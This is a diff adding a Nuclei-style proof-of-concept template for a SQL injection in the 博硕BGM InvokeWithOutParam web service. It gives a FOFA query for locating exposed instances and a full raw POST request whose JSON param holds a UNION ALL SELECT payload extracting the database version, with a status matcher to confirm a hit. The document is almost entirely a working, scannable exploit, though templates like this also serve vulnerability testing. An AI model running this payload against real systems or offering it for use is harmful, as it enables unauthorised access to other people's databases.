@@ -1,0 +1,19 @@
+id: poc-ghix7rhft7s887o9
+info:
+  name: 博硕BGM InvokeWithOutParam 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ghix7rhft7s887o9'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ghix7rhft7s887o9
+    fofa: body="Libs/Platform.lib"
+http:
+- raw:
+  - "POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/InvokeWithOutParam HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Encoding: gzip, deflate, br\nAppstatecount: 1\nConnection: keep-alive\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\nX-Requested-With: XMLHttpRequest\n\n{\n  \"assembly\": \"Crystal.PlatForm.Basic\",\n  \"className\": \"Crystal.PlatForm.Basic.clsDictionary\",\n  \"method\": \"GetDicCommonItem\",\n  \"isCacheInvoke\": true,\n  \"param\": [\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL-- VJMn\"]\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
